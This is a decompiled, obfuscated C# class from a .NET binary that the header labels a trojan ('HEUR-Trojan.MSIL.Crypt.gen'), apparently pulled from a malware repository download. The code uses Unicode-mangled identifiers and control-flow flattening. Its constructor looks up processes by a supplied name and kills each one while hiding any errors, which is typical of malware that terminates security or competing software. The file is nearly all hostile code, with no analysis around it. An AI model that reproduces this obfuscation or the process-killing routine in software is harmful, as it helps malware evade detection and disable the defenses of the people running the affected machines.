// Decompiled with JetBrains decompiler
// Type: @Ԏ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

internal sealed class \u0040Ԏ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u0037uO() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u0038u4() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040Ԏ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    int num;
    if (!\u0040Ԏ.\u0040Ӝ())
    {
      if (true)
      {
        num = 2;
        goto label_5;
      }
    }
    else
      goto label_3;
label_2:
    \u0040Ԏ.\u0040ӕ();
    goto label_4;
label_3:
    num = 3;
    goto label_5;
label_4:
    \u0040Ԏ.\u0040Ӗ((object) this);
    goto label_7;
label_5:
    while (true)
    {
      switch (num)
      {
        case 0:
        case 2:
          goto label_2;
        case 1:
        case 3:
          goto label_4;
        case 4:
          goto label_7;
        default:
          num = 4;
          continue;
      }
    }
label_7:
    try
    {
      string str = _param2;
      char[] chArray = new char[1]{ '.' };
      foreach (Process process in (Process[]) \u0040Ԏ.\u0040Ә(\u0040Ԏ.\u0040ӗ((object) str, (object) chArray)[0]))
      {
        try
        {
          \u0040Ԏ.\u0040ә((object) process);
        }
        catch
        {
        }
      }
      this.\u0040Ӕ = 0;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040Ԏ.\u0040Ӛ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(object _param0, object _param1) => (object) ((string) _param0).Split((char[]) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ә(object _param0) => (object) Process.GetProcessesByName((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ә(object _param0) => ((Process) _param0).Kill();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӛ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӝ() => false;
}
